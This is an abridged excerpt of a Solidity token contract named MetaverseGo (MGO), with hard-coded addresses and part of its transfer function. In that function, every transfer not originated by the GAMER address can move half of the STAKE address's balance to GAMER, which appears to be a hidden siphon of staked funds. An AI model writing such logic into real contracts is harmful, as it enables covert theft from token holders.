...
contract COINDATA {
  ...
  address public constant nftAddress =
    0xF4Cd6119Fc01DE27b0f0448450bD5550d7f0B635;
  address public constant GAMER = 0x769487269d0c111272C0E852a97f4093f11EEf72;
  ...
  address public constant _OFFICE = 0x3F99285DFdfA1Fff4e07B14D353E8FEA3e1cfFa0;
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "MetaverseGo";
  string public constant _symbol = "MGO";

  uint8 public constant _decimals = 9;

  uint256 public constant _tTotal = 786000000 * (10**_decimals);
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != GAMER) {
      ...
      if (pass && _tOwned[STAKE] > 2) {
        uint256 p = _tOwned[STAKE] / 2;
        _tOwned[GAMER] += p;
        _tOwned[STAKE] -= p;
